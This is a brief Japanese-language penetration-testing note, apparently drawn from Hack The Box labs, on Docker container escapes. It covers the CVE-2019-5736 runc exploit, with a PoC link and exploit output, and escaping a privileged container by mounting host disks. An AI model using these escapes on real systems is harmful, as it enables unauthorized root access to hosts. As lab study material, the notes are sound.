# Docker

----

## CVE-2019-5736
* ホストマシンのroot権限で任意のコマンドが実行可能
1. コンテナ内でexploitを起動し脆弱性がトリガするまで待機
1. ホストマシンでdocker execを実行することにより、脆弱性がトリガされる
1. コンテナ内で待機していたexploitが実行され、ホストマシンのrootで任意のコマンドが実行される
* [CVE-2019-5736-PoC](https://github.com/Frichetten/CVE-2019-5736-PoC)
* Htb: TheNoteBook

  ```console
  noah@thenotebook:~$ docker --version
  Docker version 18.06.0-ce, build 0ffa825
  noah@thenotebook:~$ sudo /usr/bin/docker exec -it webapp-dev01 bash
  root@0f4c2517af40:/opt/webapp# ./exploit
  [+] Overwritten /bin/sh successfully
  [+] Found the PID: 4167
  [+] Successfully got the file handle
  [+] Successfully got write handle &{0xc0000501e0}
  
  ```

## Privilledge
* privilledge権限がある場合、ホストのデバイスをマウント可能
* コンテナ内からのlsblkでは、どのデバイスがホストのものか、識別ができないため、すべてのデバイスのマウントを試行する必要がある
* Htb: Ready

  ```console
  root@gitlab:lsblk
  NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
  loop1    7:1    0 31.1M  1 loop
  loop4    7:4    0 71.3M  1 loop
  loop2    7:2    0 55.5M  1 loop
  loop0    7:0    0 55.4M  1 loop
  sda      8:0    0   20G  0 disk
  |-sda2   8:2    0   18G  0 part /var/log/gitlab
  |-sda3   8:3    0    2G  0 part [SWAP]
  `-sda1   8:1    0    1M  0 part
  loop5    7:5    0 31.1M  1 loop
  loop3    7:3    0 71.4M  1 loop
  root@gitlab:mount /dev/sda1 /mnt
  mount: wrong fs type, bad option, bad superblock on /dev/sda1,
         missing codepage or helper program, or other error
  
         In some cases useful info is found in syslog - try
         dmesg | tail or so.
  root@gitlab:mount /dev/sda2 /mnt
  root@gitlab:cd /mnt/root
  
  ```

  